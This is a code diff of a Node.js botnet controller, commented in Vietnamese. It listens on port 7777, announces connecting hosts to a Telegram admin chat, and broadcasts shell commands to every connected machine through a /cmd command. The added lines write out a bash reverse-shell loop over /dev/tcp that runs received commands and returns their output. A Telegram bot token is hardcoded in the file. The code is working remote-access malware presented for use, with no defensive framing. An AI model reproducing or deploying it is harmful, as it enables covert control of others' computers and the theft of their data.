@@ -5,48 +5,61 @@ const token = '8129263243:AAFApr9Z8EapobeJQoPK9hF-FdjLekrxujc';
 const chatIdAdmin = 7371969470;
 
 const bot = new TelegramBot(token, { polling: true });
+const clients = new Map(); // socket => {ip, port}
 
-const danh_sach_khach = new Map(); // key = socket, value = { ip, port }
+function sendSlaveCommand() {
+  // Lệnh slave gọn dùng curl lấy IP public rồi connect
+  const slaveCmd = 
+`while true; do
+  exec 3<>/dev/tcp/$(curl -s https://api.ipify.org)/7777
+  while read -r cmd <&3; do
+    [[ -z "$cmd" ]] && continue
+    output=$(bash -c "$cmd" 2>&1)
+    echo "$output" >&3
+  done
+  sleep 2
+done`;
 
-const server = net.createServer((socket) => {
+  bot.sendMessage(chatIdAdmin, `🔥 Server sẵn sàng trên cổng 7777\n\nCopy lệnh này chạy trên slave để kết nối:\n\`\`\`bash\n${slaveCmd}\n\`\`\``, { parse_mode: 'Markdown' });
+}
+
+const server = net.createServer(socket => {
   const ip = socket.remoteAddress;
   const port = socket.remotePort;
-  const key = socket;
-
-  danh_sach_khach.set(key, { ip, port });
+  clients.set(socket, { ip, port });
 
   bot.sendMessage(chatIdAdmin, `[+] Bot mới kết nối: ${ip}:${port}`);
 
-  socket.on('data', (data) => {
+  socket.on('data', data => {
     const msg = data.toString().trim();
-    if (msg.length > 0) {
-      console.log(`[${ip}:${port}] Kết quả:\n${msg}`);
-      // Gửi kết quả lên Telegram kèm IP:PORT
+    if (msg) {
       bot.sendMessage(chatIdAdmin, `📡 [${ip}:${port}] Kết quả:\n${msg}`);
     }
   });
 
   socket.on('close', () => {
-    danh_sach_khach.delete(key);
+    clients.delete(socket);
     bot.sendMessage(chatIdAdmin, `[-] Bot mất kết nối: ${ip}:${port}`);
   });
 
   socket.on('error', () => {
-    danh_sach_khach.delete(key);
-    bot.sendMessage(chatIdAdmin, `[-] Bot lỗi kết nối, đã xóa: ${ip}:${port}`);
+    clients.delete(socket);
+    bot.sendMessage(chatIdAdmin, `[-] Bot lỗi kết nối: ${ip}:${port}`);
   });
 });
 
-server.listen(7777, '0.0.0.0', () => {
-  console.log('[*] Server đang lắng nghe trên cổng 7777');
+server.listen(7777, () => {
+  console.log('[*] Server lắng nghe cổng 7777');
+  sendSlaveCommand();
 });
 
-bot.onText(/^\/listbot$/, (msg) => {
+bot.onText(/^\/listbot$/, msg => {
   if (msg.chat.id !== chatIdAdmin) return;
-  const count = danh_sach_khach.size;
-  let text = `🤖 Có tổng cộng ${count} bot đang kết nối:\n`;
+  if (clients.size === 0) return bot.sendMessage(chatIdAdmin, 'Không có bot nào kết nối.');
+
+  let text = `🤖 Có ${clients.size} bot đang kết nối:\n`;
   let i = 1;
-  for (const { ip, port } of danh_sach_khach.values()) {
+  for (const { ip, port } of clients.values()) {
     text += `Bot ${i} - [${ip}:${port}]\n`;
     i++;
   }
@@ -55,19 +68,13 @@ bot.onText(/^\/listbot$/, (msg) => {
 
 bot.onText(/^\/cmd (.+)$/, (msg, match) => {
   if (msg.chat.id !== chatIdAdmin) return;
-  const lenh = match[1].trim();
-  if (!lenh) {
-    bot.sendMessage(chatIdAdmin, 'Vui lòng nhập lệnh sau /cmd');
-    return;
+  const cmd = match[1].trim();
+  if (!cmd) return bot.sendMessage(chatIdAdmin, 'Nhập lệnh sau /cmd');
+
+  if (clients.size === 0) return bot.sendMessage(chatIdAdmin, 'Không có bot nào kết nối.');
+
+  for (const socket of clients.keys()) {
+    try { socket.write(cmd + '\n'); } catch {}
   }
-  if (danh_sach_khach.size === 0) {
-    bot.sendMessage(chatIdAdmin, 'Hiện không có bot nào kết nối.');
-    return;
-  }
-  for (const socket of danh_sach_khach.keys()) {
-    try {
-      socket.write(lenh + '\n');
-    } catch {}
-  }
-  bot.sendMessage(chatIdAdmin, `Đã gửi lệnh cho ${danh_sach_khach.size} bot:\n${lenh}`);
+  bot.sendMessage(chatIdAdmin, `Đã gửi lệnh cho ${clients.size} bot:\n${cmd}`);
 });
